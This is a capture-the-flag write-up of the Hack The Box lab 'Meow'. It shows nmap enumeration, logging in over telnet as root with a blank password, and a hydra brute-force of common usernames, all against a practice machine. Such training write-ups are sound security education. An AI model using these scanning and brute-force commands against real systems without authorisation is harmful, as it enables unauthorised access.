# Hack The Box Write-Up - Meow

> **Machine Name:** Meow
>
> **Machine URL:** [Meow](https://app.hackthebox.com/machines/Meow)
>
> **Ip:** 10.x.x.x
>
> **Difficulty:** Easy
>
> **OS:** Linux
>
> **Date:** 13-Dec-2025
>
> **Author:** Ahmed Abd Elghany (0xAhmedITO)

---

> **Machine About**
>
> Meow is a very easy difficulty Linux machine running a Telnet service. Weak credentials and misconfiguration allow a user to log in as root with a blank password. The machine serves as an introduction to basic enumeration and the risks of legacy protocols.

## Super Note

It's important to have your own strategy of testing/playing, regardless of the machine's difficulty.

## Enumeration

### Nmap Scan

I will scan the top-1000-ports first, this will reduce enumeration time. But if no enough attack-vectors, then I will try additional enumeration techniques.

```bash
└─$ sudo nmap --top-ports 1000 -sV -sC -O 10.x.x.x -oA top_1000_ports_scan
```

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-12 17:31 EST
Nmap scan report for 10.x.x.x
Host is up (0.11s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.47 seconds
```

**Findings:**

| Port | Service | Notes |
|-----|---------|-------|
| 23 | Telnet | Possible brute-force |

---

## Initial Access (Telnet Misconfiguration)

Trying to connect using **nc** and **telnet** commands.

```console
└─$ nc -nvv 10.x.x.x 23
(UNKNOWN) [10.x.x.x] 23 (telnet) open
��▒�� ��#��'
```

**nc** is not suitable for interacting with Telnet banners due to protocol specifics. I will try **telnet** command:

```console
└─$ telnet 10.x.x.x                
Trying 10.x.x.x...
Connected to 10.x.x.x.
Escape character is '^]'.

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login: 
```

This is good progress, i can start the exploits here.

Note: Nmap OS detection was slightly misleading due to banner/heuristics, actual OS is Ubuntu 20.04.

## Misconfiguration Check | Manual

### Common Usernames/Password to check
> admin - administrator - root - user - test

**🔹Passwordless Check**
```console
└─$ telnet 10.x.x.x 
Trying 10.x.x.x ...
Connected to 10.x.x.x .
Escape character is '^]'.

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login: admin
Password: 

Login incorrect
Meow login: administrator
Password: 

Login incorrect
Meow login: root
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

...
...
...

Last login: Mon Sep  6 15:15:23 UTC 2021 from 10.x.x.x on pts/0
root@Meow:~#
```

Easy! I got the root access, the valid username is **root**.

```console
root@Meow:~# whoami
root
```

## Misconfiguration Check | Automatic

This section is an extra, I will show how to automate the telnet brute-force using a pre-prepared wordlist. It will be helpfull if the common usernames and passwords did not work.

###🔹Passswordless brute-force:

This is a test users file.

```console
└─$ cat users.txt       
admin
administrator
root
user
test
```

Now i will use **hydra** to brute-force all of these usernames with a blank-password.

```console
└─$ sudo hydra -L users.txt -p "" telnet://10.x.x.x
[sudo] password for kali: 
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-12 18:19:57
[WARNING] telnet is by its nature unreliable to analyze, if possible better choose FTP, SSH, etc. if available
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 5 tasks per 1 server, overall 5 tasks, 5 login tries (l:5/p:1), ~1 try per task
[DATA] attacking telnet://10.x.x.x:23/
[23][telnet] host: 10.x.x.x   login: root
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-12 18:20:19
```

**Hydra** returned the valid login details (**login: root**).

---

## 🏁 Flags

###🔹Looking for the flag file and capture it.

```console
root@Meow:~# id
uid=0(root) gid=0(root) groups=0(root)
root@Meow:~# ls
flag.txt  snap
root@Meow:~# cat flag.txt | sed 's/./*/g'
********************************
```

<img width="2282" height="1028" alt="image" src="https://github.com/user-attachments/assets/855b2389-facc-4fa6-ac01-0b233ef3118e" />

The root flag captured, I replaced all characters of the flag by * following the HTB policies.

---

## 🔗 References

* [https://hackviser.com/tactics/pentesting/services/telnet]

---
